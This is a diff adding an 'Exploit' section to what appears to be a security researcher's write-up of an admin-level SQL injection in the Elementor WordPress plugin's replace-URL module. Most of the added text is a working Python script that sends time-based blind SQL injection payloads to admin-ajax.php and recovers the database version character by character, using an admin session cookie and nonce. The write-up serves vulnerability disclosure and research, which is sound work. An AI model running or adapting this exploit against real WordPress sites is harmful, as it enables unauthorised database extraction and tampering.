@@ -45,3 +45,34 @@ Above payload will update the meta_key to key4 of meta_id=999999
     ![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/Untitled%204.png)
     
     wp-content/plugins/elementor/includes/utils.php#L172-184
+
+** Exploit**
+
+```python
+import requests as r 
+import string
+from requests import Timeout
+import urllib.parse
+import time
+import re
+
+url = "http://localhost:8000/payatu/wordpress/wp-admin/admin-ajax.php?_fs_blog_admin=true"
+#proxies = {"http":"http://localhost:8080"}
+possibilites = string.digits+'-.'+string.ascii_lowercase
+data = "action=elementor_replace_url&from=http%3A%2F%2Flocalhost%3A8000&to=http%3A%2F%2Flocalhost%3A8000%2F%3Ftest')%2Cmeta_key%3D'key7'where%2Bmeta_id%3D(99999)and((IF((SELECT%2Bversion()like'{}%25')%2Csleep(2)%2C0)))%3B%23&_nonce=6253de9ef8"
+version = ""
+headers = {"Cookie":"wordpress_logged_in_e695f32e6b8dbfe4dad4de7d8125134d=<redacted>;","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
+
+while 1:
+    for char in possibilites:
+        try:
+            body = data.format(version+char)
+            res = r.post(url,data=body,timeout=2,headers=headers)
+
+        except Timeout:
+            version+=char
+            print(version)
+            break
+```
+
+![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/sqlDatabase.png)
